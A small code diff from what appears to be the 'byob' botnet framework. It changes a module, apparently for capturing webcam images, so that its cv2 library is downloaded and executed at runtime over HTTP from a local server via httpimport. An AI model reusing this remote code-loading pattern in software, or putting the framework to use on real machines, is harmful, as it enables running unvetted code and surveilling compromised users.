@@ -5,16 +5,29 @@ https://github.com/colental/byob
 Copyright (c) 2018 Daniel Vega-Myhre
 """
 from __future__ import print_function
+
 # standard libarary
+
 import os
 import sys
-import cv2
 import time
 import pickle
 import socket
 import struct
+import httpimport
+
 # byob
+
 import util
+
+# remote imports
+
+with httpimport.remote_repo(['cv2'], base_url='http://localhost:8000'):
+    try:
+        import cv2
+    except ImportError:
+        util.debug("Error: unable to import '%s'" % 'cv2')
+
 
 
 def image(*args, **kwargs):
